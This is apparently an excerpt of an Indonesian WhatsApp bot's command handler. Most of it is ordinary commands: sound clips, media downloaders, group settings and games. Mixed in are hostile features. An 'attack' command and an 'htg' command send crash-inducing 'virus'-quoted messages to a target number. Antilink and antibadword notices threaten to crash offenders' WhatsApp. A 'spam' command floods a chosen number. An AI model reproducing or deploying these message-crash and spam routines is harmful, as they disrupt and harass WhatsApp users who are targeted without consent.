                limitAdd(sender, limit)
                break
            case prefix+'sound45':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound45', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound45.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound46':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound46', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound46.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound47':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound47', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound47.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound48':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound48', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound48.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound49':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound49', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound49.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound50':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound50', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound50.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound51':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound51', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound51.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound52':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound52', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound52.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound53':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound53', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound53.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound54':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound54', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound54.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound55':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound55', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound55.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound56':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound56', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound56.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound57':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound57', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound57.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound58':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound58', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound58.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound59':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound59', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound59.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound60':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound60', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound60.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound61':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound61', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound61.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound62':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound62', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound62.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound63':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound63', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound63.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound64':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound64', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound64.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound65':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound65', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound65.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound66':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound66', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound66.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound67':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound67', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound67.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound68':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound68', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound68.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound69':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound69', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound69.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound70':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound70', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound70.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound71':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound71', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound71.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound72':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound72', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound72.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound73':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound73', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound73.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            case prefix+'sound74':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#sound74', sender, _cmd)
                satganz.sendMessage(from, { audio: { url: './lib/sound/sound74.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted: msg })
                limitAdd(sender, limit)
                break
            // Textpro Menu
            case prefix+'pencil':
			...
			case prefix+'ttnowm':
                ...
                satganz.sendMessage(from, {
				video: { url: nyz.video },
				caption: `*TITLE* : ${nyz.title}\n*AUTHOR* : ${nyz.author}`,
				footer: setting.footext}, { quoted : msg })
				 limitAdd(sender, limit)
			    break
			case prefix+'tiktokaudio':
			    ...
			    reply("_Wait a minute, data is being processed!_")
			    var riy = await fetchJson(`https://malesin.xyz/tiktok2?url=${q}`)
			      satganz.sendMessage(from, { audio: { url: riy.result.audio }, mimetype: 'audio/mp4' }, { quoted: msg })
			       limitAdd(sender, limit)
		        break
			case prefix+'xnxxdl':
			case prefix+'xdl':
			if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
			    ...
			    addCountCmd('#tiktokaudio', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
				var nyz = await fetchJson(`https://malesin.xyz/xnxxdl?url=${q}`)
                satganz.sendMessage(from, {
				video: { url: nyz.result.files.low },
				caption: `*TITLE* : ${nyz.result.title}\n*DURATION* : ${nyz.result.duration}`,
				footer: setting.footext }, { quoted : msg })
				  limitAdd(sender, limit)
			    break
            case prefix+'play':
			...
			case prefix+'ytmp4': case prefix+'mp4':
			    ...
			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/yt?url=${args[1]}`)
			      ...
			      satganz.sendMessage(from, { video: { url: riy.result.mp4 }, caption: teks }, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			case prefix+'ytmp3': case prefix+'mp3':
			    ...
			    addCountCmd('#ytmp4', sender, _cmd)
			    reply("_Wait a minute, data is being processed!_")
			    var riy = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=mmc&url=${q}`)
			      satganz.sendMessage(from, { audio: { url: riy.result.getAudio }, mimetype: 'audio/mp4' }, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			case prefix+'getvideo': case prefix+'getvidio':
			    ...
			    xfar.downloader.youtube(`https://youtube.com/watch?v=${arrey[args[1] -1]}`).then( data => {
			      ...
			      satganz.sendMessage(from, { video: { url: data.medias[1].url }, caption: teks }, { quoted: msg })
			       limitAdd(sender, limit)
			...
			case prefix+'getmusik': case prefix+'getmusic':
			    ...
			    xfar.downloader.youtube(`https://youtube.com/watch?v=${arrey[args[1] -1]}`).then( data => {
			      ...
			      satganz.sendMessage(from, { image: { url: data.thumbnail }, caption: teks }, { quoted: msg })
			      satganz.sendMessage(from, { document: { url: data.medias[7].url }, fileName: `${data.title}.mp3`, mimetype: 'audio/mp3' }, { quoted: msg })
			      limitAdd(sender, limit)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'igdl': case prefix+'instagram': case prefix+'ig':
			    ...
			    xfar.downloader.instagram(args[1]).then( data => {
			     ...
			     for (let i of data.medias) {
				  if (i.extension === "mp4") {
				   satganz.sendMessage(from, { video: { url: i.url }})
				  } else if (i.extension === "jpg") {
				   satganz.sendMessage(from, { image: { url: i.url }})
			      }
			     }
				 limitAdd(sender, limit)
			    }).catch(() => reply("Maaf terjadi kesalahan"))
			...
			case prefix+'facebook': case prefix+'fbdl':
			    ...
			    var riy = await fetchJson(`https://rest-api-riy.herokuapp.com/api/dowloader/fbdown?url=${args[1]}`)
			      satganz.sendMessage(from, { video: { url: riy.result.url }, caption: riy.result.title }, { quoted: msg })
			      limitAdd(sender, limit)
			    break
			// Owner Menu
			case prefix+'exif':
			...
			case prefix+'join':
				...
				var data = await satganz.groupAcceptInvite(url)
			...
			case prefix+'randomquote': case prefix+'randomquotes':
                ...
                jpegThumbnail: { url : setting.pathimg }, fileName: "~ QUOTES ~", mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileLength: '9999999', pageCount: '999',
                caption: data.result.quotes+'\n\n-- '+data.result.author,
                footer: setting.footext,
                mentions: [sender],
                templateButtons: [{ urlButton: { displayText: `SALIN`, url : 'https://www.whatsapp.com/otp/copy/${data.result.quotes}' } },
				{ urlButton: { displayText: `Instagram`, url : setting.medsos.instagram } },
				{ quickReplyButton: { displayText: `🧑 Owner`, id: `${prefix}owner` } },
				{ quickReplyButton: { displayText: `💰 Donasi`, id: `${prefix}donate` } },
				{ quickReplyButton: { displayText: `⏭️ Next`, id: `${command}` } }
                ...
                satganz.sendMessage(from, message, { quoted : msg })
				limitAdd(sender, limit)
				break
			case prefix+'cecan': case prefix+'cewek':
				...
				satganz.sendMessage(from, { caption: "Random Cewe Cantik", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
			    limitAdd(sender, limit)
 			    break
			case prefix+'cogan': case prefix+'cowok':
				...
				var data = await pinterest(pickRandom(query))
				var but = [{buttonId: `${command}`, buttonText: { displayText: "Next Photo" }, type: 1 }]
				satganz.sendMessage(from, { caption: "Random Cowo Ganteng", image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
			    limitAdd(sender, limit)
				break
            case 'truthordare':
            case prefix+'tod':
               addCountCmd('#truthordare', sender, _cmd)
               var butb = [
			   { urlButton: { displayText: `Group Ofc`, url : setting.medsos.group } },
			   { urlButton: { displayText: `Instagram`, url : setting.medsos.instagram } },
			   { quickReplyButton: { displayText: `💬 Truth`, id: `truth` } },
			   { quickReplyButton: { displayText: `💬 Dare`, id: `dare` } }
		        ]
                var message = {
                document: { url: setting.pathimg },
                jpegThumbnail: { url : setting.pathimg }, fileName: "~ Truth Or Dare? ~", mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileLength: '9999999', pageCount: '999',
                caption: 'Truth Or Dare?',
                footer: setting.footext,
                templateButtons: butb
                }
                satganz.sendMessage(from, message, { quoted : msg })
                break
            case prefix+'dare':
             addCountCmd('#dare', sender, _cmd)
             var dare = await fetchJson(`https://zenzapis.xyz/entertainment/dare?apikey=mmc`)
             var message = {
                document: { url: setting.pathimg },
                jpegThumbnail: { url : setting.pathimg }, fileName: "~ Truth Or Dare? ~", mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileLength: '9999999', pageCount: '999',
                caption: dare.result,
                footer: setting.footext,
                templateButtons: buttonsNext
                }
                satganz.sendMessage(from, message, { quoted : msg })
                break
             case prefix+'truth':
             addCountCmd('#truth', sender, _cmd)
             var truth = await fetchJson(`https://zenzapis.xyz/entertainment/truth?apikey=mmc`)
             var message = {
                document: { url: setting.pathimg },
                jpegThumbnail: { url : setting.pathimg }, fileName: "~ Truth Or Dare? ~", mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileLength: '9999999', pageCount: '999',
                caption: truth.result,
                footer: setting.footext,
                templateButtons: buttonsNext
                }
                satganz.sendMessage(from, message, { quoted : msg })
            ...
            case prefix+'ppcouple': case prefix+'ppcp':
                ...
                reply("_Wait a minute, data is being processed!_")
                var data = await fetchJson(`https://zenzapis.xyz/randomanime/couples?apikey=mmc`)
                satganz.sendMessage(from, { caption: 'Male', image: { url: data.result.male }}, { quoted: msg})
                satganz.sendMessage(from, { caption: 'Female', image: { url: data.result.female }}, { quoted: msg})
                limitAdd(sender, limit)
                break
            case prefix+'logomaker':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                addCountCmd('#logomaker', sender, _cmd)
                if (args.length < 2) return reply(`Examples of use : ${command} >Text1<|*>Text2<*`) 
                var t1 = q.split("|")[0]
                var t2 = q.split("|")[1]
                reply("_Wait a minute, data is being processed!_")
                var logo = await fetchJson(`https://zenzapis.xyz/ephoto/logo?text=${t1}&text2=${t2}&apikey=mmc`)
                satganz.sendMessage(from, { caption: setting.footext, image: { url: logo }}, { quoted: msg})
                limitAdd(sender, limit)
                break
			// Search Menu    
			case prefix+'lirik': case prefix+'liriklagu':
			    ...
			    ra.Musikmatch(q).then(async(data) => {
				  ...
				  satganz.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: msg })
			...
			case prefix+'pinterest':
			    ...
			    pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
				  if (q.includes('--')) {
					...
					for (let i = 0; i < jumlah; i++) {
					  satganz.sendMessage(from, { image: { url: data.result[i] }})
					}
				    limitAdd(sender, limit)
				  } else {
					var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
					satganz.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: msg })
				    limitAdd(sender, limit)
				  }
				})
			    break
 ...
 *${prefix}getvideo <no urutan>*
 Untuk mengambil Audio/Video dari hasil pencarian`
				...
				satganz.sendMessage(from, { image: { url: yt[0].image }, caption: txt }, { quoted: msg })
				limitAdd(sender, limit)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			// Game Menu
			...
			case prefix+'tebakgambar':
		        if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
			    if (isPlayGame(from, tebakgambar)) return satganz.reply(from, `Masih ada game yang belum diselesaikan`, tebakgambar[getGamePosi(from, tebakgambar)].msg)
			    addCountCmd('#tebakgambar', sender, _cmd)
				kotz.tebakgambar().then( data => {
				  data = data[0]
				  data.jawaban = data.jawaban.split('Jawaban ').join('')
				  var teks = `*TEBAK GAMBAR*\n\n`+monospace(`Petunjuk : ${data.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
				  satganz.sendMessage(from, { image: { url: data.image }, caption: teks }, { quoted: msg })
				  .then( res => {
			...
			case prefix+'linkgrup': case prefix+'link': case prefix+'linkgc':
				...
				var url = await satganz.groupInviteCode(from).catch(() => reply("Maaf terjadi kesalahan"))
			...
			case prefix+'setppgrup': case prefix+'setppgc':
				...
				if (isImage || isQuotedImage) {
			      ...
			      await satganz.updateProfilePicture(from, { url: media })
				  .then( res => {
					reply(`Sukses`)
					fs.unlinkSync(media)
				  }).catch(() => reply("Maaf terjadi kesalahan"))
			...
			case prefix+'setnamegrup': case prefix+'setnamegc':
				...
				await satganz.groupUpdateSubject(from, q)
			    .then( res => {
				  reply(`Sukses`)
				}).catch(() => reply("Maaf terjadi kesalahan"))
			    break
			case prefix+'setdesc': case prefix+'setdescription':
				...
				await satganz.groupUpdateDescription(from, q)
			    .then( res => {
			      reply(`Sukses`)
				}).catch(() => reply("Maaf terjadi kesalahan"))
				break
            case prefix+'attack':
	        if (!isOwner && !isPremium) return mess(Prem)
	        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            ...
            var cekon = await satganz.onWhatsApp(nomore)
                 if (cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
           ...
           },
           {
            ...
            if (isUsr) return reply('Button ini bukan untukmu!\n\n This Button not foryou!')
            let spar = q.split("|")[0]
            ...
            satganz.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: virus})
            }
            let ter = q.split("|")[1]
            reply(`Success Attack Target During Attack ${ter} Minutes`)
            break
            case prefix+'htg':
            if (!isOwner) reply('only owner can use this features')
            satganz.sendMessage(from, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: virus})
            break
			case prefix+'group': case prefix+'grup':
				...
				if (args[1] == "close") {
				  satganz.groupSettingUpdate(from, 'announcement')
				  reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
				} else if (args[1] == "open") {
				  satganz.groupSettingUpdate(from, 'not_announcement')
			...
			case prefix+'revoke':
				...
				await satganz.groupRevokeInvite(from)
			    .then( res => {
            ...
            case prefix+'tagall': case prefix+'infoall':
                   ...
                   tekss += `\© SatganzDevs`
                   satganz.sendMessage(from, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: msg })
                   break
			case prefix+'hidetag':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
				...
				satganz.sendMessage(from, { text: q ? q : '', mentions: mem })
			    break
            case prefix+'fakehidetag':
                   if (!isPremium) return mess(Prem)
                   if (!isGroup) return reply(mess.OnlyGrup)
                   ...
                   satganz.sendMessage(from, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
                   break
                        case prefix+'welcome':
                            if (!isGroup) return reply('group only')
                            if (!isGroupAdmins && !isOwner) return mess(Admin)
							if (!q) { var listMsg = { text: `MODE *${command}*`,bbuttonText: 'OPEN', footer: setting.footext, mentions: [sender], sections: [{title: "PILIH", rows: [{title: "AKTIF", rowId: `${command} enable`, description: `${command} Enable`},{title: "NONAKTIF", rowId: `${command} disable`, description: `${command} Disable`}]},]}
           			     satganz.sendMessage(from, listMsg)}
                            if (body.toLowerCase() === "enable") {
                              if (isWelcome) return reply(`*${command}* sudah aktif`)
                              addCountCmd('#welcome', sender, _cmd)
                              welcome.push(from)
                              fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses mengaktifkan *${command}* di grup ini`)
                            } else if (body.toLowerCase() === "disable") {
                              if (!isWelcome) return reply(`*${command}* sudah nonaktif`)
                              addCountCmd('#welcome', sender, _cmd)
                              var posi = welcome.indexOf(from)
                              welcome.splice(posi, 1)
                              fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses menonaktifkan *${command}* di grup ini`)
                            } else {
                              var listMsg = {
                			  text: `MODE *${command}*`,
                			  buttonText: 'OPEN',
              				...
              				title: "PILIH",
               			   rows: [
          				    {title: "AKTIF", rowId: `${command} enable`, description: `${command} Enable`},
          				    {title: "NONAKTIF", rowId: `${command} disable`, description: `${command} Disable`}
								]
             					 },
             					]
            					}
                            ...
                            if (args[1].toLowerCase() === "enable") {
                              if (isAntilink) return reply(`*${command}* sudah aktif`)
                              addCountCmd('#antilink', sender, _cmd)
                              antilink.push(from)
                              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                              reply(`Sukses mengaktifkan *${command}* di grup ini`)
                              let participants = msg.isGroup ? await groupMetadata.participants : ''
                              satganz.sendMessage(from, { text : '*PERHATIAN!!*\nadmin telah mengaktifkan *ANTILINK*\n jangan mengirim link group, jika masih berani mengirim, whatsapp pengirim akan crash selama 1 menit.', mentions: participants.map(a => a.id)}, { quoted : msg })
                            } else if (args[1].toLowerCase() === "disable") {
                              if (!isAntilink) return reply(`*${command}* sudah nonaktif`)
                              addCountCmd('#antilink', sender, _cmd)
           			     ...
           			     satganz.sendMessage(from, listMsg)}
                            if (args[1].toLowerCase() === "enable") {
                              if (isAntiBadword) return reply(`*${command}* sudah aktif`)
                              addCountCmd('#antibadword', sender, _cmd)
                              antibadword.push(from)
                              fs.writeFileSync('./database/antibadword.json', JSON.stringify(antibadword, null, 2))
                              reply(`Sukses mengaktifkan *${command}* di grup ini`)
                              let participants = msg.isGroup ? await groupMetadata.participants : ''
                              satganz.sendMessage(from, { text : '*PERHATIAN!!*\nadmin telah mengaktifkan *ANTIBADWORD*\n jangan TOXIC di group ini, jika masih berani toxic, whatsapp pengirim akan crash selama 1 menit.', mentions: participants.map(a => a.id)}, { quoted : msg })
                            } else if (args[1].toLowerCase() === "disable") {
                              if (!isAntiBadword) return reply(`*${command}* sudah nonaktif`)
                              addCountCmd('#antibadword', sender, _cmd)
                              var posi = antibadword.indexOf(from)
                              antibadword.splice(posi, 1)
                              fs.writeFileSync('./database/antibadword.json', JSON.stringify(antibadword, null, 2))
                              reply(`Sukses menonaktifkan *${command}* di grup ini`)
                            } else {
                              var listMsg = {
           			     ...
           			     satganz.sendMessage(from, listMsg)}
                            if (args[1].toLowerCase() === "enable") {
                              if (isAutoSticker) return reply(`*${command}* sudah aktif`)
                              addCountCmd('#autosticker', sender, _cmd)
                              autostik.push(from)
                              fs.writeFileSync('./database/autostiker.json', JSON.stringify(autostik, null, 2))
                              reply(`Sukses mengaktifkan *${command}* di grup ini`)
                            } else if (args[1].toLowerCase() === "disable") {
                              if (!isAutoSticker) return reply(`*${command}* sudah nonaktif`)
                              addCountCmd('#autosticker', sender, _cmd)
                              var posi = antibadword.indexOf(from)
                              autostik.splice(posi, 1)
                              fs.writeFileSync('./database/autostiker.json', JSON.stringify(autostik, null, 2))
                              reply(`Sukses menonaktifkan *${command}* di grup ini`)
                            } else {
                              var listMsg = {
            ...
            if (isVideo || isQuotedVideo) {
                     var fileName = 'video'+makeid(10)+'.mp3'
                     var media = await satganz.downloadAndSaveMediaMessage(msg, 'video', `${fileName}`)
                     satganz.sendMessage(from, { audio: { url: media }, mimetype: 'audio/mp4', ptt: false}, { quoted: msg })
                     } else {
                     	reply("kirim video dengan caption/reply toaud ")
                     }
                     break
            // Fun menu
            case prefix+'spam':
            ...
            var cekon = await satganz.onWhatsApp(tod)
                 if (cekon.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
if (isNaN(count)) return reply(`Harus nomor, kocak`)
if (Number(count) >= 100 ) throw reply('Kebanyakan')
for (let i = 0; i < count; i++){
	...
	break
			...
			// Balasan Menfess © Satganz Devs
         if (isMenfess && isCmd && isTo) {
         	for (let bi of menfess) {
         	var mun = [];
			mun.push(bi.from)
			satganz.copyNForward(bi.from, msg, true)
		   } 
		}
          if (isMenfess && isCmd && isSend) {
          	var mun = [];
			for (let gU of menfess) {
			mun.push(gU.to)
			satganz.copyNForward(gU.to, msg, true)
			}
			}
